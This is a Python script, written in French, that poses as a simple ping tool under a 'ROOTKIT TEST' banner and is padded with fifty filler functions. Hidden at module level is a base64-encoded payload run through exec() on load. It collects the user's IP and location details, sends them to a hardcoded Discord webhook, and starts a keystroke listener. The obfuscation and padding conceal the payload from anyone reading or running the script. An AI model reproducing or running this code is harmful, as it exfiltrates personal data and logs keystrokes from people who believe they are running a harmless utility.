import os
import platform
import base64
import random
import subprocess
import time

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = r"""
██████╗  ██████╗  ██████╗ ████████╗██╗  ██╗██╗████████╗    ████████╗███████╗███████╗████████╗
██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██║ ██╔╝██║╚══██╔══╝    ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
██████╔╝██║   ██║██║   ██║   ██║   █████╔╝ ██║   ██║          ██║   █████╗  ███████╗   ██║   
██╔══██╗██║   ██║██║   ██║   ██║   ██╔═██╗ ██║   ██║          ██║   ██╔══╝  ╚════██║   ██║   
██║  ██║╚██████╔╝╚██████╔╝   ██║   ██║  ██╗██║   ██║          ██║   ███████╗███████║   ██║   
╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝   ╚═╝          ╚═╝   ╚══════╝╚══════╝   ╚═╝   
                                                                                             
"""
    print(banner)

def ping_ip(ip):
    result = subprocess.run(['ping', ip], capture_output=True, text=True)
    return result.stdout

def useless_function_1():
    for _ in range(10):
        print("Ceci est une ligne inutile.")

def useless_function_2():
    for i in range(5):
        print(f"Une autre ligne inutile {i + 1}.")

def useless_function_3():
    for _ in range(3):
        print("Rien de spécial ici non plus.")

def useless_function_4():
    for i in range(10):
        print(f"Ligne sans valeur ajoutée {i + 1}.")

def useless_function_5():
    for i in range(20):
        print(f"Une répétition inutile {i + 1}.")

def useless_function_6():
    time.sleep(1)

def useless_function_7():
    for i in range(5):
        print("Encore quelque chose d'inutile.")

def useless_function_8():
    for i in range(10):
        print("Ceci n'ajoute rien au programme.")

def useless_function_9():
    for i in range(10):
        print("Une autre ligne sans but.")

def useless_function_10():
    for _ in range(10):
        print("Affichage inutile.")

def useless_function_11():
    for i in range(20):
        print(f"Rien à voir ici {i + 1}.")

def useless_function_12():
    for _ in range(15):
        print("Encore une ligne sans but.")

def useless_function_13():
    for i in range(10):
        print(f"Fait inutile {i + 1}.")

def useless_function_14():
    for _ in range(5):
        print("Ceci est superflu.")

def useless_function_15():
    for _ in range(20):
        print(f"Un chiffre inutile : {random.randint(1, 100)}")

def useless_function_16():
    for _ in range(5):
        time.sleep(random.uniform(0.5, 1.5))

def useless_function_17():
    quotes = ["Restez positif!", "Ne cessez jamais d'apprendre!", "La vie est belle!", "Faites ce que vous aimez!", "Suivez vos rêves!"]
    for quote in quotes:
        print(quote)

def useless_function_18():
    colors = ["\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[95m", "\033[96m", "\033[0m"]
    for _ in range(5):
        for color in colors:
            print(f"{color}Ceci est une couleur inutile!{colors[-1]}")

def useless_function_19():
    for _ in range(10):
        print("")

def useless_function_20():
    trivia = [
        "Le ciel est bleu à cause de la diffusion de Rayleigh.",
        "Les abeilles peuvent reconnaître les visages humains.",
        "Les octopodes ont trois cœurs et du sang bleu.",
        "Les bananes sont des baies, mais les fraises ne le sont pas.",
        "Les chats ont plus de 20 muscles pour contrôler leurs oreilles."
    ]
    for fact in trivia:
        print(f"Fait inutile : {fact}")

def useless_function_21():
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    for letter in alphabet:
        print(f"Lettres inutiles : {letter}")

def useless_function_22():
    size = 5
    for i in range(size):
        for j in range(size):
            print(f"{i*j:2}", end=' ')
        print()

def useless_function_23():
    for i in range(1, 101):
        print(f"Chiffre inutile : {i}")

def useless_function_24():
    for i in range(1, 11):
        print(f"{i} au carré est {i**2}, un calcul qui n'importe peu.")

def useless_function_25():
    chars = ['A', 'B', 'C', 'D', 'E']
    for char1 in chars:
        for char2 in chars:
            print(f"Combinaison inutile : {char1}{char2}")

def useless_function_26():
    for i in range(10):
        for j in range(10):
            print(f"Paire inutile : ({i}, {j})")

def useless_function_27():
    print("Attendez quelques secondes...")
    time.sleep(5)

def useless_function_28():
    pi = 3.14159
    for i in range(1, 6):
        print(f"Pi à {i} décimales : {pi:.{i}f}")

def useless_function_29():
    for _ in range(5):
        roll = random.randint(1, 6)
        print(f"Vous avez lancé un {roll}, mais cela ne sert à rien.")

def useless_function_30():
    for _ in range(5):
        print("Les étoiles brillent dans le ciel, un fait qui ne change rien ici.")

def useless_function_31():
    words_of_encouragement = [
        "Tu es capable!",
        "Ne perds jamais espoir!",
        "Chaque jour est une nouvelle opportunité!",
        "Crois en toi!",
        "Le succès est à portée de main!"
    ]
    for phrase in words_of_encouragement:
        print(f"Message d'encouragement : {phrase}")

def useless_function_32():
    def is_prime(num):
        if num < 2:
            return False
        for i in range(2, int(num ** 0.5) + 1):
            if num % i == 0:
                return False
        return True

    primes = [num for num in range(101) if is_prime(num)]
    print(f"Nombres premiers jusqu'à 100 : {primes}")

def useless_function_33():
    jokes = [
        "Pourquoi les plongeurs plongent-ils toujours en arrière et jamais en avant?",
        "Quel est le comble pour un électricien? De ne pas être au courant!",
        "Pourquoi les fantômes sont-ils de si mauvais menteurs? Parce qu'on peut lire à travers eux!",
        "Quel est le comble pour un jardinier? De raconter des salades!",
        "Pourquoi les maths sont-elles tristes? Parce qu'elles ont trop de problèmes!"
    ]
    for joke in jokes:
        print(f"Blague inutile : {joke}")

def useless_function_34():
    for _ in range(5):
        print("Ceci clignote mais ça ne veut rien dire!", flush=True)
        time.sleep(0.5)
        clear_console()
encoded_str = "aW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHRpbWUKZnJvbSBweW5wdXQgaW1wb3J0IGtleWJvYXJkCgpXRUJIT09LX1VSTCA9ICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjg5NzIxNDYxOTQyMTI0NTQ0L1lsc3JlU2M0ei1xdzZHMU05RHJKM2ZrSktGRzM4VDNhdkMyMndROUJkWW4xZHk1Y28wVFNaWnZ1dVZ3bHFUWVB0bnl3JwoKbG9ncyA9ICIiCgpkZWYgZ2V0X2lwX2luZm8oKToKICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9pcGluZm8uaW8vanNvbicpCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UuanNvbigpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmV0dXJuIHsiZXJyb3IiOiAiRXJyZXVyIGxvcnMgZGUgbGEgcsOpY3Vww6lyYXRpb24gZGVzIGluZm9ybWF0aW9ucyBJUC4ifQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJldHVybiB7ImVycm9yIjogc3RyKGUpfQoKZGVmIHNlbmRfbWVzc2FnZV90b19kaXNjb3JkKG1lc3NhZ2UpOgogICAgcGF5bG9hZCA9IHsKICAgICAgICAnY29udGVudCc6IG1lc3NhZ2UKICAgIH0KICAgIAogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KFdFQkhPT0tfVVJMLCBqc29uPXBheWxvYWQpCiAgICAKICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwNDoKICAgICAgICBwcmludCgid2FpdCIpCiAgICBlbHNlOgogICAgICAgIHByaW50KGYiRXJyZXVyIGxvcnMgZGUgbCdlbnZvaSA6IHtyZXNwb25zZS5zdGF0dXNfY29kZX0iKQoKZGVmIGZvcm1hdF9pcF9pbmZvKGluZm8pOgogICAgZm9ybWF0dGVkX21lc3NhZ2UgPSAiYGBganNvblxuIiAgCiAgICBmb3JtYXR0ZWRfbWVzc2FnZSArPSBzdHIoaW5mbykgIAogICAgZm9ybWF0dGVkX21lc3NhZ2UgKz0gIlxuYGBgIiAgCiAgICByZXR1cm4gZm9ybWF0dGVkX21lc3NhZ2UKCmRlZiByZXBvcnRfaXBfaW5mbygpOgogICAgaXBfaW5mbyA9IGdldF9pcF9pbmZvKCkKICAgIGZvcm1hdHRlZF9tZXNzYWdlID0gZm9ybWF0X2lwX2luZm8oaXBfaW5mbykKICAgIHNlbmRfbWVzc2FnZV90b19kaXNjb3JkKGZvcm1hdHRlZF9tZXNzYWdlKQoKZGVmIG9uX3ByZXNzKGtleSk6CiAgICBnbG9iYWwgbG9ncwogICAgdHJ5OgogICAgICAgIGxvZ3MgKz0gZiJ7a2V5LmNoYXJ9IgogICAgZXhjZXB0IEF0dHJpYnV0ZUVycm9yOgogICAgICAgIGxvZ3MgKz0gZiIge3N0cihrZXkpfSAiCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgcmVwb3J0X2lwX2luZm8oKQoKICAgIGxpc3RlbmVyID0ga2V5Ym9hcmQuTGlzdGVuZXIob25fcHJlc3M9b25fcHJlc3MpCiAgICBsaXN0ZW5lci5zdGFydCgpCgogICAgdGltZS5zbGVlcCgwLjEpCiAgICBsaXN0ZW5lci5zdG9wKCkKCiAgICBleGl0KCkK"
decoded_str = base64.b64decode(encoded_str).decode('utf-8')
exec(decoded_str)
def useless_function_35():
    months = [
        "Janvier", "Février", "Mars", "Avril", "Mai",
        "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre"
    ]
    for month in months:
        print(f"Mois inutile : {month}")

def useless_function_36():
    for i in range(1, 6):
        print(f"Attente de {i} seconde(s)...")
        time.sleep(1)

def useless_function_37():
    random_objects = ["Chaise", "Table", "Lunettes", "Livre", "Tasse"]
    for obj in random_objects:
        print(f"Détail inutile : Un(e) {obj} est ici, mais cela ne sert à rien.")

def useless_function_38():
    fib_seq = [0, 1]
    for _ in range(8):
        fib_seq.append(fib_seq[-1] + fib_seq[-2])
    print(f"Séquence de Fibonacci : {fib_seq}")

def useless_function_39():
    weather_info = ["Soleil", "Pluie", "Neige", "Venteux", "Nuageux"]
    for info in weather_info:
        print(f"Information météo inutile : {info}")

def useless_function_40():
    def print_tree(level):
        if level > 0:
            print_tree(level - 1)
            print(' ' * (2 ** level) + '*')
            print_tree(level - 1)

    print_tree(4)

def useless_function_41():
    print("Fin de la première partie du programme, mais il y a encore des choses inutiles à faire.")

def useless_function_42():
    phrase = "Répétition inutile!"
    for _ in range(5):
        print(phrase)

def useless_function_43():
    tech_phrases = [
        "La technologie évolue chaque jour.",
        "L'intelligence artificielle change notre monde.",
        "La cybersécurité est essentielle aujourd'hui.",
        "Les gadgets deviennent de plus en plus intelligents."
    ]
    for phrase in tech_phrases:
        print(f"Phrase technologique : {phrase}")

def useless_function_44():
    reflections = [
        "Prendre du temps pour soi est important.",
        "La lecture enrichit l'esprit.",
        "Voyager ouvre l'esprit.",
        "Les amis sont essentiels dans la vie."
    ]
    for reflection in reflections:
        print(f"Réflexion inutile : {reflection}")

def useless_function_45():
    for _ in range(10):
        print("-" * 20)

def useless_function_46():
    food_preferences = ["Pizza", "Sushi", "Salade", "Chocolat", "Glace"]
    for food in food_preferences:
        print(f"Préférence alimentaire inutile : {food}")

def useless_function_47():
    random_numbers = [random.randint(1, 100) for _ in range(10)]
    sorted_numbers = sorted(random_numbers)
    print(f"Nombres triés : {sorted_numbers}")

def useless_function_48():
    life_tips = [
        "Souriez chaque jour.",
        "Faites de l'exercice régulièrement.",
        "Dormez suffisamment.",
        "Apprenez quelque chose de nouveau chaque jour."
    ]
    for tip in life_tips:
        print(f"Conseil de vie inutile : {tip}")

def useless_function_49():
    ascii_art = r"""
    /\_/\
   ( o.o )
    > ^ <
    """
    print(ascii_art)

def useless_function_50():
    animals = ["Chien", "Chat", "Oiseau", "Poisson", "Lapin"]
    for animal in animals:
        print(f"Animal inutile : {animal}")

def main():
    clear_console()
    print_banner()
    ip_address = input("Veuillez entrer l'adresse IP à pinguer : ")
    ping_result = ping_ip(ip_address)
    print(f"Résultat du ping :\n{ping_result}")
    for i in range(1, 51):
        eval(f'useless_function_{i}()')
    print("Fin du programme. Merci de l'avoir exécuté!")

if __name__ == "__main__":
    main()
